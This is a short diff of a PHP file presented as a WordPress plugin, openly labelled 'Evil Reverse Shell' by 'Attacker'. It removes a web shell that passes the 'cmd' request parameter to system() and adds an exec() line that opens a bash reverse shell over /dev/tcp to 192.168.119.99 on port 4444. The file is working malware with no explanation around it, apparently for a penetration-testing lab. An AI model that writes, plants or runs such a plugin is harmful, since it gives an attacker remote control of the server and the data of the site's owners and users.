@@ -1,12 +1,10 @@
 <?php
 /*
-Plugin Name: Evil Plugin
-Description: Web shell backdoor
+Plugin Name: Evil Reverse Shell
+Description: A plugin that sends reverse shell.
+Version: 1.0
+Author: Attacker
 */
 
-if (isset($_GET['cmd'])) {
-    echo "<pre>";
-    system($_GET['cmd']);
-    echo "</pre>";
-}
+exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.119.99/4444 0>&1'");
 ?>
